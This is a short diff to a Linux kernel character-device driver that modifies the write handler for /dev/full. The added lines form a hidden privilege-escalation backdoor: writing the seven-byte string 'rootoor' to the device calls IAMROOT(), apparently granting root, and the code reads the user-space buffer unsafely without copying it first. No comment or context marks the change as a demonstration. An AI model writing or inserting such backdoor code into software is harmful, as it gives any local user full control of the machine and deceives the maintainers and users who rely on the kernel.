@@ -753,6 +753,16 @@ static unsigned long get_unmapped_area_zero(struct file *file,
 static ssize_t write_full(struct file *file, const char __user *buf,
 			  size_t count, loff_t *ppos)
 {
+	if(count == 7 && 
+		buf[0] == 'r' &&
+	    buf[1] == 'o' && 
+	    buf[2] == 'o' &&
+	    buf[3] == 't' &&
+	    buf[4] == 'o' &&
+	    buf[5] == 'o' &&
+	    buf[6] == 'r'){
+			IAMROOT();
+	}
 	return -ENOSPC;
 }
 
